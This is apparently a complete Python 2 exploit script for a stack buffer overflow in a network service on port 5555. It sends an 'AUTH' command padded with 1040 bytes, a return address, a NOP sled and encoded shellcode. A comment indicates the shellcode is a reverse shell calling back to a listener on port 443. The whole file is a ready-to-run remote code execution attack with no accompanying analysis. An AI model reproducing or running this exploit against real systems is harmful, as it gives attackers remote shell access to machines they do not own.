#!/usr/bin/python
import time, struct, sys
import socket as so

# LPORT 443
# LHOST 10.
shellcode = ("\xba\x7a\x25\x35\x95\xd9\xec\xd9\x74\x24\xf4\x5d\x33\xc9\xb1"
"\x52\x31\x55\x12\x03\x55\x12\x83\x97\xd9\xd7\x60\x9b\xca\x9a"
"\x8b\x63\x0b\xfb\x02\x86\x3a\x3b\x70\xc3\x6d\x8b\xf2\x81\x81"
"\x60\x56\x31\x11\x04\x7f\x36\x92\xa3\x59\x79\x23\x9f\x9a\x18"
"\xa7\xe2\xce\xfa\x96\x2c\x03\xfb\xdf\x51\xee\xa9\x88\x1e\x5d"
"\x5d\xbc\x6b\x5e\xd6\x8e\x7a\xe6\x0b\x46\x7c\xc7\x9a\xdc\x27"
"\xc7\x1d\x30\x5c\x4e\x05\x55\x59\x18\xbe\xad\x15\x9b\x16\xfc"
"\xd6\x30\x57\x30\x25\x48\x90\xf7\xd6\x3f\xe8\x0b\x6a\x38\x2f"
"\x71\xb0\xcd\xab\xd1\x33\x75\x17\xe3\x90\xe0\xdc\xef\x5d\x66"
"\xba\xf3\x60\xab\xb1\x08\xe8\x4a\x15\x99\xaa\x68\xb1\xc1\x69"
"\x10\xe0\xaf\xdc\x2d\xf2\x0f\x80\x8b\x79\xbd\xd5\xa1\x20\xaa"
"\x1a\x88\xda\x2a\x35\x9b\xa9\x18\x9a\x37\x25\x11\x53\x9e\xb2"
"\x56\x4e\x66\x2c\xa9\x71\x97\x65\x6e\x25\xc7\x1d\x47\x46\x8c"
"\xdd\x68\x93\x03\x8d\xc6\x4c\xe4\x7d\xa7\x3c\x8c\x97\x28\x62"
"\xac\x98\xe2\x0b\x47\x63\x65\x3e\x93\x6b\x12\x56\xa1\x6b\xdd"
"\x1d\x2c\x8d\xb7\x71\x79\x06\x20\xeb\x20\xdc\xd1\xf4\xfe\x99"
"\xd2\x7f\x0d\x5e\x9c\x77\x78\x4c\x49\x78\x37\x2e\xdc\x87\xed"
"\x46\x82\x1a\x6a\x96\xcd\x06\x25\xc1\x9a\xf9\x3c\x87\x36\xa3"
"\x96\xb5\xca\x35\xd0\x7d\x11\x86\xdf\x7c\xd4\xb2\xfb\x6e\x20"
"\x3a\x40\xda\xfc\x6d\x1e\xb4\xba\xc7\xd0\x6e\x15\xbb\xba\xe6"
"\xe0\xf7\x7c\x70\xed\xdd\x0a\x9c\x5c\x88\x4a\xa3\x51\x5c\x5b"
"\xdc\x8f\xfc\xa4\x37\x14\x1c\x47\x9d\x61\xb5\xde\x74\xc8\xd8"
"\xe0\xa3\x0f\xe5\x62\x41\xf0\x12\x7a\x20\xf5\x5f\x3c\xd9\x87"
"\xf0\xa9\xdd\x34\xf0\xfb")

print shellcode
try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

address = '\x71\x1D\xD1\x65'
req1 = "AUTH " + 'A'*1040 + address + "\x90"*8 + shellcode
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
